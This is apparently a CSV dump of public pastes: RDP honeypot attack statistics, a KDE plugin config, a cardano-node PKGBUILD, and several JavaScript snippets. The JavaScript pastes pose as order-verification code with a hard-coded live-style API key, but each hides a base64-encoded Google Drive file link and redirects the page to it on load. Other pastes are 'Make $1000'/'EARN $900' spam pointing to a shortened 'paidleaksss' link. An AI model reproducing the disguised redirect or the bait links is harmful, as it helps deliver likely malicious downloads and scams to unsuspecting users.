id,title,username,language,date,content
35hD2TCD,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:18:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63501,
    ""156.146.57.110"": 34326,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72027,
    ""AS212238"": 51528,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72027,
    ""Datacamp Limited"": 51528,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72027,
    ""Datacamp Limited"": 51528,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123585,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126165,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135348,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135477
  },
  ""client_build"": {
    ""Unknown"": 135477
  },
  ""client_name"": {
    ""Unknown"": 135477
  },
  ""ip_type"": {
    ""hosting & proxy"": 126666,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
LkncLDaj,Market.js,jm33,JavaScript,Saturday 5th of April 2025 07:18:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12330/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xyj2nAjC,Make $1000 15-MINUTES (BEGINNER) RQ,fedello66,JavaScript,Saturday 5th of April 2025 07:16:44 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


32eoaG9V6F
"
LAfGQpCR,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63500,
    ""156.146.57.110"": 34324,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72026,
    ""AS212238"": 51526,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72026,
    ""Datacamp Limited"": 51526,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72026,
    ""Datacamp Limited"": 51526,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123582,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126162,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135345,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135474
  },
  ""client_build"": {
    ""Unknown"": 135474
  },
  ""client_name"": {
    ""Unknown"": 135474
  },
  ""ip_type"": {
    ""hosting & proxy"": 126663,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
bBVcz9ks,2025-04-04_stats.json,rdp_snitch,JSON,Saturday 5th of April 2025 07:15:16 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 63499,
    ""156.146.57.110"": 34322,
    ""156.146.57.174"": 8592,
    ""150.95.89.149"": 8574,
    ""138.199.24.30"": 8526,
    ""156.146.57.52"": 8610,
    ""147.182.229.114"": 105,
    ""146.190.105.191"": 2580,
    ""106.14.144.233"": 426,
    ""58.218.199.219"": 18,
    ""194.164.107.4"": 30,
    ""185.147.124.177"": 9,
    ""167.94.138.118"": 3,
    ""205.210.31.221"": 9,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""185.147.124.165"": 9,
    ""198.235.24.99"": 9,
    ""92.255.85.92"": 3,
    ""198.12.89.161"": 9,
    ""20.151.163.246"": 6,
    ""198.235.24.235"": 9,
    ""121.134.238.166"": 3,
    ""42.96.5.120"": 3,
    ""103.171.175.21"": 84,
    ""88.214.25.124"": 6,
    ""91.238.181.96"": 6,
    ""147.185.132.222"": 9
  },
  ""asn"": {
    ""AS60068"": 72025,
    ""AS212238"": 51524,
    ""AS135161"": 8574,
    ""AS14061"": 2685,
    ""AS37963"": 426,
    ""AS4134"": 18,
    ""AS50219"": 30,
    ""AS49505"": 18,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS49434"": 12,
    ""AS207566"": 3,
    ""AS36352"": 9,
    ""AS8075"": 6,
    ""AS4766"": 3,
    ""AS135967"": 3,
    ""AS151734"": 84,
    ""AS35042"": 6
  },
  ""isp"": {
    ""DataCamp Limited"": 72025,
    ""Datacamp Limited"": 51524,
    ""GMO-Z.COM PTE. LTD."": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Chinanet"": 18,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""JSC Selectel"": 18,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 12,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HostPapa"": 9,
    ""Microsoft Corporation"": 6,
    ""Korea Telecom"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Webyne Data Centre Private Limited"": 84,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Cdn77 SGP"": 72025,
    ""Datacamp Limited"": 51524,
    ""Zcom Thai"": 8574,
    ""DigitalOcean, LLC"": 2685,
    ""Aliyun Computing Co., LTD"": 426,
    ""Chinanet JS"": 18,
    ""Valence Technology Co"": 30,
    ""Almira LLC"": 18,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 93,
    ""Microsoft Azure Cloud (canadacentral)"": 6,
    ""Kornet"": 3,
    ""Bach Kim Network solutions Join stock company"": 3
  },
  ""regionName"": {
    ""North West"": 123579,
    ""Tokyo"": 8574,
    ""California"": 141,
    ""South West"": 2580,
    ""Shanghai"": 426,
    ""Jiangsu"": 18,
    ""Moscow"": 21,
    ""Michigan"": 3,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 12,
    ""New York"": 9,
    ""Ontario"": 6,
    ""Seoul"": 3,
    ""Ninh B\u00ecnh Province"": 3,
    ""Tamil Nadu"": 84,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 126159,
    ""Japan"": 8574,
    ""United States"": 153,
    ""China"": 444,
    ""Russia"": 21,
    ""Lithuania"": 6,
    ""France"": 12,
    ""Canada"": 6,
    ""South Korea"": 3,
    ""Vietnam"": 3,
    ""India"": 84,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 135342,
    ""eltons"": 15,
    ""administr"": 15,
    ""Domain"": 27,
    ""(empty)"": 9,
    ""nKBnjirwm"": 3,
    ""oUAGhu"": 3,
    ""LbgnfO"": 3,
    ""Test"": 27,
    ""xcoByLBGo"": 3,
    ""afVfWn"": 3,
    ""xSJiGO"": 3,
    ""HFzHxRVkA"": 3,
    ""vFXbZf"": 3,
    ""nebnzw"": 3,
    ""JoOLDQGCN"": 3,
    ""fHMojH"": 3,
    ""SOrhae"": 3
  },
  ""keyboard"": {
    ""Unknown"": 135471
  },
  ""client_build"": {
    ""Unknown"": 135471
  },
  ""client_name"": {
    ""Unknown"": 135471
  },
  ""ip_type"": {
    ""hosting & proxy"": 126660,
    ""hosting"": 8655,
    ""proxy"": 21,
    ""Unknown"": 135
  }
}"
S1tPVs0m,Untitled,jm33,JavaScript,Saturday 5th of April 2025 07:02:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56080/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ChMrLLLA,EARN $900 INSTANTLY 2025 V9,raheemrule,JavaScript,Saturday 5th of April 2025 07:00:02 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


BGcE5ZezN7
"
EujHAW4w,Products.js,jm33,JavaScript,Saturday 5th of April 2025 06:47:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22601/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p5z02P73,Make $1000 15-MINUTES (BEGINNER) RV,raheemrule,JavaScript,Saturday 5th of April 2025 06:44:08 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


C5AJv3bmbl
"
9zFCNaWJ,Order.js,jm33,JavaScript,Saturday 5th of April 2025 06:32:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11378/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nYC53B06,EARN $900 INSTANTLY 2025 V9,iwantscript132421,JavaScript,Saturday 5th of April 2025 06:25:03 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


ulUpbS42C2
"
qRe3i9bU,Market.js,jm33,JavaScript,Saturday 5th of April 2025 06:16:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82152/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LNF0qAv6,purposenc,SalNos,Bash,Saturday 5th of April 2025 06:06:47 PM CDT,"### Related to: https://github.com/KDE/purpose?tab=readme-ov-file
[plugins]
#
# list: $ ls /usr/lib/qt6/plugins/kf6/purpose
#
# saso@arch:/usr/lib/qt6/plugins/kf6/purpose$ ls
# barcodeplugin.so    emailplugin.so       kdeconnectsmsplugin.so  phabricatorplugin.so  saveasplugin.so
# bluetoothplugin.so  imgurplugin.so       nextcloudplugin.so      purpose_gdrive.so     telegramplugin.so
# clipboardplugin.so  kdeconnectplugin.so  pastebinplugin.so       reviewboardplugin.so  youtubeplugin.so
# 
# just remove .so
# example:
# disabled=kdeconnectplugin,imgurplugin
#
disabled=barcodeplugin,bluetoothplugin,imgurplugin,nextcloudplugin,purpose_gdrive,clipboardplugin,pastebinplugin,youtubeplugin"
03F8TKPA,cardano-node PKGBUILD,andrejpodzimek,Bash,Saturday 5th of April 2025 06:01:47 PM CDT,"pkgname=cardano-node
pkgver=10.2.1
pkgrel=99
pkgdesc='The core component that is used to participate in a Cardano decentralised blockchain.'
license=('Apache')
arch=('any')
url='https://github.com/input-output-hk/cardano-node'
_ghc_version='9.10.1'
_cabal_version='3.12.1.0'
makedepends=('git' 'ghcup-hs-bin')
depends=('libsodium')
backup=(""etc/conf.d/cardano-node""
        ""var/lib/cardano-node/config/mainnet-config.json""
        ""var/lib/cardano-node/config/mainnet-topology.json""
        ""var/lib/cardano-node/config/mainnet-topology-p2p.json""
        ""var/lib/cardano-node/config/testnet-config.json""
        ""var/lib/cardano-node/config/testnet-topology.json""
        ""var/lib/cardano-node/config/testnet-topology-p2p.json"")
source=(""https://github.com/input-output-hk/${pkgname}/archive/${pkgver}.zip""
        'mainnet-config.json::https://book.world.dev.cardano.org/environments/mainnet/config.json'
        'mainnet-byron-genesis.json::https://book.world.dev.cardano.org/environments/mainnet/byron-genesis.json'
        'mainnet-shelley-genesis.json::https://book.world.dev.cardano.org/environments/mainnet/shelley-genesis.json'
        'mainnet-alonzo-genesis.json::https://book.world.dev.cardano.org/environments/mainnet/alonzo-genesis.json'
        'mainnet-conway-genesis.json::https://book.world.dev.cardano.org/environments/mainnet/conway-genesis.json'
        'mainnet-topology.json::https://book.world.dev.cardano.org/environments/mainnet/topology.json'
        'mainnet-topology-p2p.json::https://book.world.dev.cardano.org/environments/mainnet/topology-p2p.json'
        'testnet-config.json::https://book.world.dev.cardano.org/environments/preprod/config.json'
        'testnet-byron-genesis.json::https://book.world.dev.cardano.org/environments/preprod/byron-genesis.json'
        'testnet-shelley-genesis.json::https://book.world.dev.cardano.org/environments/preprod/shelley-genesis.json'
        'testnet-alonzo-genesis.json::https://book.world.dev.cardano.org/environments/preprod/alonzo-genesis.json'
        'testnet-conway-genesis.json::https://book.world.dev.cardano.org/environments/preprod/conway-genesis.json'
        'testnet-topology.json::https://book.world.dev.cardano.org/environments/preprod/topology.json'
        ### 'testnet-topology-p2p.json::https://book.world.dev.cardano.org/environments/preprod/topology-p2p.json'
        ""cardano-node.sysusers""
        ""cardano-node.tmpfiles""
        ""cardano-node.service""
        ""cardano-node.confd""
        ""cardano-node-testnet.service""
        ""cardano-node-testnet.confd"")
sha256sums=('3c290dbc61c96412a951c307405e2428e93c06f332766bbbac94d59d2dfd43c5'
            '997bdea73d599d0ea5b72205de6fad391adeadb3beef34145cddc990a16e61b7'
            '4f28b3b437b2c4f6ee26cc70964b3a5f1a274b0b3909c31535091c00316c13aa'
            '59cd3932c6dd792bc5020ca3336064a8faabde4e4a8dc7d143ff4df6eec36961'
            '7333bfafe311589fa09e8bf59a47ec0d85a1959f00748cc0800591d2c7646408'
            '0e70fc5317732e178aa2a3c6579e5123573d25525ee11af1261f3c4151fffddb'
            '6fb9ee83834603b0c2d0b679e0322ebe04208490dfcf402e3aa6df51bab30a9b'
            '6fb9ee83834603b0c2d0b679e0322ebe04208490dfcf402e3aa6df51bab30a9b'
            'c25b85b8b86101c6ca8364e8d8aa6206cf51b2517b6152b9eac6fef247e2bf51'
            'd88fbffdf78daaccfaddf504e95840c73ce527c06fa4140aefb55d3f91c00cef'
            '4b9d32c09159c2948e4386ba1f59db5a249a89b43b84dfd8368f465e650095de'
            '7333bfafe311589fa09e8bf59a47ec0d85a1959f00748cc0800591d2c7646408'
            'c196814fe2e8f36ad1910e5c287184970339657729e7ad4fc354c34e149be3f8'
            '45488c0879b1e8ac0fc10ec3ee93db103be7e3476f943495067df6970a03c02c'
            '703f9b033c299b652b2d3228ee6ef4a9c09b7e846ff4b366a2aca68960370234'
            '3212902b0d2bb0e6bacba0feeafd261516b9f6ab5f37f876a8c37239a1947542'
            'a712b09a9e9594dad7c8cb2cbb4a4eaa691fb0c3ba8491edfb5d0a56dfaf2c29'
            '809f5b67dd8ec0216655347361935d7d6a23299a31ff795f6c5ec806501bc5fd'
            'd5badb9167fddcb4abdad451f7f2a8ee2eb00d7e1631b85778ba2ae783c263c2'
            '07a3dde7fb51f3f84bb51e7c15993dfefa337571ed509cc3588e73c54f606282')

prepare() {
  cd ""${srcdir}/${pkgname}-${pkgver}""
  # NOTE: this is used to avoid running out of space when
  # /tmp is not large enough
  mkdir -p ${srcdir}/ghcup_tmp
  TMPDIR=${srcdir}/ghcup_tmp ghcup install ghc ${_ghc_version}
  TMPDIR=${srcdir}/ghcup_tmp ghcup install cabal ${_cabal_version}
  ghcup set ghc ${_ghc_version}
  ghcup set cabal ${_cabal_version}
  export PATH=""$HOME/.cabal/bin:$HOME/.ghcup/bin:$PATH""
  export PKG_CONFIG_PATH='/usr/lib/pkgconfig'
  cabal configure --with-compiler=ghc-${_ghc_version}
  echo 'package cardano-crypto-praos' >> ${srcdir}/${pkgname}-${pkgver}/cabal.project.local
  echo '  flags: -external-libsodium-vrf' >> ${srcdir}/${pkgname}-${pkgver}/cabal.project.local
  cabal update
}

build() {
  cd ""${srcdir}/${pkgname}-${pkgver}""
  cabal build all
  cabal build cardano-cli
}

package() {
  install -D -m0644 ""${srcdir}/${pkgname}.sysusers"" ""${pkgdir}/usr/lib/sysusers.d/${pkgname}.conf""
  install -D -m0644 ""${srcdir}/${pkgname}.tmpfiles"" ""${pkgdir}/usr/lib/tmpfiles.d/${pkgname}.conf""
  install -D -m0644 ""${srcdir}/${pkgname}.service"" ""${pkgdir}/usr/lib/systemd/system/${pkgname}.service""
  install -D -m0644 ""${srcdir}/${pkgname}.confd"" ""${pkgdir}/etc/conf.d/${pkgname}""

  install -D -m0644 ""mainnet-config.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-config.json""
  install -D -m0644 ""mainnet-byron-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-byron-genesis.json""
  install -D -m0644 ""mainnet-shelley-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-shelley-genesis.json""
  install -D -m0644 ""mainnet-alonzo-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-alonzo-genesis.json""
  install -D -m0644 ""mainnet-conway-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-conway-genesis.json""
  install -D -m0644 ""mainnet-topology.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-topology.json""
  install -D -m0644 ""mainnet-topology-p2p.json"" ""${pkgdir}/var/lib/${pkgname}/config/mainnet-topology-p2p.json""
  install -D -m0644 ""testnet-config.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-config.json""
  install -D -m0644 ""testnet-byron-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-byron-genesis.json""
  install -D -m0644 ""testnet-shelley-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-shelley-genesis.json""
  install -D -m0644 ""testnet-alonzo-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-alonzo-genesis.json""
  install -D -m0644 ""testnet-conway-genesis.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-conway-genesis.json""
  install -D -m0644 ""testnet-topology.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-topology.json""
  ### install -D -m0644 ""testnet-topology-p2p.json"" ""${pkgdir}/var/lib/${pkgname}/config/testnet-topology-p2p.json""

  install -D -m0644 ""${srcdir}/${pkgname}-testnet.service"" ""${pkgdir}/usr/share/${pkgname}/${pkgname}-testnet-example.service""
  install -D -m0644 ""${srcdir}/${pkgname}-testnet.confd"" ""${pkgdir}/usr/share/${pkgname}/${pkgname}-testnet-example.confd""

  cd ""${srcdir}/${pkgname}-${pkgver}""
  install -D -m0755 ""$(./scripts/bin-path.sh cardano-cli)"" ""${pkgdir}/usr/bin/cardano-cli""
  install -D -m0755 ""$(./scripts/bin-path.sh cardano-node)"" ""${pkgdir}/usr/bin/cardano-node""
}"
6FkZk4hW,Untitled,jm33,JavaScript,Saturday 5th of April 2025 06:01:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88490/status"";
